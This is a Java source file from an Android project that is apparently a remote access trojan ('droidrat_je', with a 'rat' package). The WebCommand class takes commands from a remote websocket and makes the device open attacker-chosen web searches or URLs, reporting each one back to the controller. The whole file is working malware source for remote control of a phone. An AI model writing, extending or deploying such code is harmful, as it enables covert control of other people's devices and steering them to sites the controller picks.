package com.je_chen.droidrat_je.command;

import android.content.Context;
import android.util.Log;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.command.process_super.CommandProcessInterface;
import com.je_chen.droidrat_je.rat.modules.appintent.web.Web;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class WebCommand extends CommandFather implements CommandProcessInterface {

    private final String TAG = "Web Event ";

    private Web web;

    private Context context;

    public WebCommand(Context context){
        this.context=context;
        web = new Web();
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {
                case "WebSearch":
                    String webUri1 = rawCommandArray[2];
                    Log.d(TAG,"Websearch " + webUri1);
                    web.webSearch(context,webUri1);
                    this.send("Websearch:" + webUri1);
                    break;

                case "OpenWeb":
                    String webUri2 = rawCommandArray[2];
                    Log.d(TAG,"Openweb " + webUri2);
                    web.openWeb(context,webUri2);
                    this.send("Openweb:" + webUri2);
                    break;
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
